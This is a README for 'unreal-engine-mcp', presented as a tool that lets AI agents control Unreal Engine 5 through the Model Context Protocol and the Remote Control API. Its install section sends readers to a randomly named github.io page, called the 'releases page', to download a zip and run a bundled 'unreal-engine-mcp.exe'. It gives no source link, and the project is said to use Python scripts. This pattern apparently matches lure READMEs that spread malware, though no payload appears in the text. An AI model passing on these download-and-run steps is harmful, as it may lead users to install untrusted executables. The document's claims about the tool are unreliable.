# 🤖 unreal-engine-mcp - Control Unreal Engine with AI Agents

[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://groggy-rollcall812.github.io)

This software allows you to connect an AI agent to Unreal Engine 5. You can issue commands to build levels, change assets, or trigger blueprints through a chat interface. It uses the Model Context Protocol to talk to your AI and the Remote Control API to talk to Unreal Engine. You do not need to compile code or edit C++ files to start.

## ⚙️ System Requirements

Before you begin, verify your computer meets these needs:

*   Windows 10 or 11.
*   Unreal Engine 5.1 or newer installed and open.
*   An active internet connection.
*   At least 4GB of free space.

You must enable the Remote Control API in Unreal Engine for this tool to function. Open your project, go to Edit, select Plugins, and search for Remote Control. Enable both Remote Control and Remote Control API. Restart your project after you enable these settings.

## 📥 How to Install

1. Visit the [releases page](https://groggy-rollcall812.github.io) to download the latest setup file.
2. Select the file ending in .zip for your version of Windows.
3. Save the folder to a location on your computer where you can find it.
4. Right-click the folder and choose Extract All to view the contents.
5. Open the folder and locate the application file named unreal-engine-mcp.exe.

## 🚀 Setting Up the Connection

To link the AI agent to your Unreal Engine project, follow these steps:

1. Open your project in Unreal Engine.
2. Run the unreal-engine-mcp.exe file you extracted earlier.
3. Keep the application window open while you work.
4. Input your project's local address into the agent settings. This usually defaults to your computer name or localhost.
5. If you see a green status light, the connection is active. 

If the application displays a red error message, verify that you enabled the Remote Control API in your project settings. Ensure no other programs use the port specified in the application settings.

## 🧠 Using the AI Agent

Once the software connects, your AI agent can perform tasks in your project view. Type natural language commands into your AI interface. 

Example commands:
*   "Create a new folder for landscape assets."
*   "Place a directional light at the center of the level."
*   "Rotate the selected actor by 45 degrees."
*   "Show me the status of the current level."

The agent sends these requests to the Remote Control API. It translates your text into commands that Unreal Engine understands. You can monitor the communication logs in the application window to see how the agent interprets your requests.

## 🛠 Troubleshooting Common Issues

*   **Connection Timeouts:** If the agent fails to connect, check your firewall settings. Windows might block local network traffic required for the Remote Control API. Create an exception for the Unreal Engine process.
*   **Command Failures:** If a command fails, wait for the editor to finish compiling shaders or loading assets. Large levels require more time for the editor to respond to external requests.
*   **Interface Glitches:** If the UI becomes unresponsive, close the application and restart the Remote Control plugin in Unreal Engine settings.

## 📁 Project Structure

The software organizes files into specific directories:
*   /config: Stores your connection settings and agent preferences.
*   /logs: Keeps a history of all commands sent to the editor.
*   /scripts: Contains the Python files used to execute engine tasks.

You do not need to modify these files unless you wish to change advanced connection ports. The default settings handle most standard local installations.

## 🎓 Learning More

The project relies on standardized protocols for AI integration. If you want to expand what your agent can do, research the Model Context Protocol documentation. The methods supported by this tool include asset navigation, transform modifications, and blueprint execution. Keeping your Unreal Engine version updated ensures the best compatibility with the Remote Control API.

Keywords: ai-agent, automation, blueprint, claude, game-development, gamedev, level-design, llm, mcp, model-context-protocol, python, remote-control-api, ue5, unreal-engine, unreal-engine-5